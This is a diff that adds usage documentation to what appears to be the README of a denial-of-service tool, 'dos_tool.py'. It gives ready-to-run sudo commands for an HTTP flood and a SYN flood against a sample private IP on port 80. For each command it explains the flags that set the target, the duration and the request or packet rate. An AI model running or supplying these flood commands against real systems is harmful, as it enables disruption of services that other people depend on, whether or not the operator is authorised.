@@ -198,3 +198,31 @@ syn_flood.start_attack(): Starts it.
  if __name__ == "__main__":
 
 main(): Runs main() only if the script is executed directly (not imported as a module).
+
+
+Usage:
+HTTP Flood:
+
+bash
+sudo python dos_tool.py http -t 192.168.47.135 -p 80 -u urls.txt -d 30 -i 50
+-t 192.168.47.135: Target IP or domain.
+
+-p 80: Target port.
+
+-u urls.txt: File containing URLs to flood.
+
+-d 30: Attack duration in seconds.
+
+-i 50: Number of concurrent requests per second.
+
+SYN Flood:
+
+bash
+sudo python dos_tool.py syn -t 192.168.47.135 -p 80 -d 30 -i 100
+-t 192.168.47.135: Target IP.
+
+-p 80: Target port.
+
+-d 30: Attack duration in seconds.
+
+-i 100: Packets per second.
